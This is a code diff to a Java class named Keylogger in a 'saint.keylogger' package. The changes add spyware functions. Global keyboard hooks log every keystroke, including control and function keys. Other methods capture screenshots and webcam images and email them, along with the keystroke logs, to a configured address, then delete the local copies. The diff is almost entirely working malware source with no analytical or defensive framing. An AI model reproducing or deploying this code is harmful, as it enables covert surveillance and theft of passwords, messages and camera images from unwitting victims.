@@ -1,13 +1,17 @@
 package saint.keylogger;
 
+import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.nio.channels.FileChannel;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.logging.Level;
+import saint.email.SendEmail;
 
 public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
 
@@ -86,19 +90,19 @@ public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
         }
     }
 
-    public static void createFolder(String path){
+    private static void createFolder(String path) {
         new File(path).mkdir();
     }
 
-    private static void deleteFolder(String path){
+    private static void deleteFolder(String path) {
         File folder = new File(path);
         File[] files = folder.listFiles();
-        for (File file: files) {
+        for (File file : files) {
             file.delete();
         }
     }
 
-    private static void deleteData(){
+    private static void deleteData() {
         if (!keepdata) {
             deleteFolder(app_path + path_logs);
             deleteFolder(app_path + path_screenshot);
@@ -145,5 +149,198 @@ public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
                 send();
             }
         }
+    }
+
+    public void sendAll() {
+        try {
+            nameFileScreenshot = dateFormatHour.format(new Date()).toString();
+            Screenshot.TakeScreenshot(app_path + path_screenshot, dateFormatHour.format(new Date()));
+
+            nameFileCam = dateFormatHour.format(new Date()).toString();
+            Cam.Capture(app_path + path_cam, dateFormatHour.format(new Date()), cam_width, cam_height);
+
+        } catch (Exception ex) {
+            System.out.println(ex.getMessage());
+        }
+        new Thread(() -> {
+            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
+            e.sendEmailAttachment(
+                    email_to,
+                    subject,
+                    logs_send,
+                    app_path + path_screenshot + nameFileScreenshot + ".jpg",
+                    app_path + path_cam + nameFileCam + ".png",
+                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
+            );
+            deleteData();
+        }).start();
+    }
+
+    public void sendScreenshot() {
+        try {
+            nameFileScreenshot = dateFormatHour.format(new Date()).toString();
+            Screenshot.TakeScreenshot(app_path + path_screenshot, dateFormatHour.format(new Date()));
+        } catch (Exception ex) {
+            System.out.println(ex.getMessage());
+        }
+        new Thread(() -> {
+            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
+            e.sendEmailAttachment(
+                    email_to,
+                    subject,
+                    logs_send,
+                    app_path + path_screenshot + nameFileScreenshot + ".jpg",
+                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
+            );
+            deleteData();
+        }).start();
+    }
+
+    public void sendCam() {
+        try {
+            nameFileCam = dateFormatHour.format(new Date()).toString();
+            Cam.Capture(app_path + path_cam, dateFormatHour.format(new Date()), cam_width, cam_height);
+        } catch (Exception ex) {
+            System.out.println(ex.getMessage());
+        }
+        new Thread(() -> {
+            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
+            e.sendEmailAttachment(
+                    email_to,
+                    subject,
+                    logs_send,
+                    app_path + path_cam + nameFileCam + ".png",
+                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
+            );
+            deleteData();
+        }).start();
+    }
+
+    public void send() {
+        new Thread(() -> {
+            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
+            e.sendEmailAttachment(
+                    email_to,
+                    subject,
+                    logs_send,
+                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
+            );
+            deleteData();
+        }).start();
+    }
+
+    @Override
+    public void nativeKeyPressed(NativeKeyEvent nke) {
+//        System.out.println(nke.getRawCode());
+        switch (nke.getRawCode()) {
+            case 8:
+                SaveLogs("[Backspace]");
+                break;
+            case 9:
+                SaveLogs("[Tab]");
+                break;
+            case 13:
+                SaveLogs("[Enter]");
+                break;
+//            case 19:
+//                SaveLogs("[PauseBreak]");
+//                break;
+//            case 27:
+//                SaveLogs("[Esc]");
+//                break;
+//            case 33:
+//                SaveLogs("[PgUp]");
+//                break;
+//            case 34:
+//                SaveLogs("[PgDown]");
+//                break;
+//            case 35:
+//                SaveLogs("[End]");
+//                break;
+//            case 36:
+//                SaveLogs("[Home]");
+//                break;
+//            case 37:
+//                SaveLogs("[Left]");
+//                break;
+//            case 38:
+//                SaveLogs("[Up]");
+//                break;
+//            case 39:
+//                SaveLogs("[Right]");
+//                break;
+//            case 40:
+//                SaveLogs("[Down]");
+//                break;
+//            case 44:
+//                SaveLogs("[PrintScreen]");
+//                break;
+//            case 45:
+//                SaveLogs("[Insert]");
+//                break;
+            case 46:
+                SaveLogs("[Del]");
+                break;
+            case 112:
+                SaveLogs("[F1]");
+                break;
+            case 113:
+                SaveLogs("[F2]");
+                break;
+            case 114:
+                SaveLogs("[F3]");
+                break;
+            case 115:
+                SaveLogs("[F4]");
+                break;
+            case 116:
+                SaveLogs("[F5]");
+                break;
+            case 117:
+                SaveLogs("[F6]");
+                break;
+            case 118:
+                SaveLogs("[F7]");
+                break;
+            case 119:
+                SaveLogs("[F8]");
+                break;
+            case 120:
+                SaveLogs("[F9]");
+                break;
+            case 121:
+                SaveLogs("[F10]");
+                break;
+            case 122:
+                SaveLogs("[F11]");
+                break;
+            case 123:
+                SaveLogs("[F12]");
+                break;
+            case 144:
+                SaveLogs("[NumLock]");
+                break;
+            case 162:
+                SaveLogs("[Ctrl]");
+                break;
+            case 163:
+                SaveLogs("[Ctrl]");
+                break;
+            case 164:
+                SaveLogs("[Alt]");
+                break;
+            case 165:
+                SaveLogs("[Alt]");
+                break;
+        }
+    }
+
+    @Override
+    public void nativeKeyReleased(NativeKeyEvent nke) {
+    }
+
+    @Override
+    public void nativeKeyTyped(NativeKeyEvent nke) {
+        SaveLogs(String.valueOf(nke.getKeyChar()));
     }
 }
